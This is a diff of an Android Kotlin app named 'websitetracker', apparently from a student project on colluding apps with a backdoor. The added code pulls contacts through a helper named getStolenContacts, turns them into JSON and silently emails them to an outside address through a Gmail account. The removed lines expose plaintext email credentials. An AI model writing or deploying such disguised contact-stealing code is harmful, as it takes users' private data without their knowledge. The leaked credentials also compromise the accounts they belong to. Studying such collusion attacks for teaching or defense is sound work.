@@ -1,17 +1,16 @@
 package com.example.websitetracker
 
 import android.annotation.SuppressLint
-import android.content.ContentProviderClient
-import android.net.Uri
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.TYPE_PLAIN
 import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.newBuilder
-
+import com.google.gson.Gson
 
 /**
  * #license Copyright 2015 Yesid Lazaro
+ * https://github.com/yesidlazaro/GmailBackground
  *
  * Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements.
  * See the NOTICE file distributed with this work for additional information regarding copyright ownership.
@@ -31,32 +30,8 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // Look here how to get the info
-
-        // Get the right ContentProvider
-        val contactURI: Uri =
-            Uri.parse("content://com.example.contacts.provider.ContactContentProvider/contacts")
-        val contentResolver: ContentProviderClient? =
-            contentResolver.acquireContentProviderClient(contactURI)
-
-        if (contentResolver != null) {
-            //Here we get the contacts
-            var cursor = contentResolver.query(contactURI, null, null, null, null)
-            if (cursor != null && cursor.count > 0) {
-                while (cursor.moveToNext()) {
-                    val id = cursor.getString(cursor.getColumnIndex("contact_id"))
-                    val name = cursor.getString(cursor.getColumnIndex("name"))
-                    val number = cursor.getString(cursor.getColumnIndex("numbers"))
-                    Log.v("Contact : ", "Name : $name, Id :$id, Number : $number")
-                }
-            }
-        }
-
-        /**
-         * Creds
-         * collusion.enseirb@gmail.com CollEGL21
-         * it362.test2021@gmail.com enseirbtest
-         */
+        val stolenContacts = ContentResolverHelper(applicationContext).getStolenContacts()
+        Log.i("MainActivity", "stolenContacts= $stolenContacts")
 
         newBuilder(this)
             .withUsername("it362.test2021@gmail.com")
@@ -64,7 +39,7 @@ class MainActivity : AppCompatActivity() {
             .withMailto("it362.test2021@yopmail.com")
             .withType(TYPE_PLAIN)
             .withSubject("Android project")
-            .withBody("<TODO: Put all the contacts here>\nSource Code: https://gitlab.com/sstan001/two-apps-one-backdoor")
+            .withBody("stolenContacts= ${Gson().toJson(stolenContacts)}")
             .withOnSuccessCallback {
                 Log.i("MainActivity", "Successful mail sending!")
             }
@@ -74,6 +49,4 @@ class MainActivity : AppCompatActivity() {
             .withProcessVisibility(false)
             .send()
     }
-
-
 }
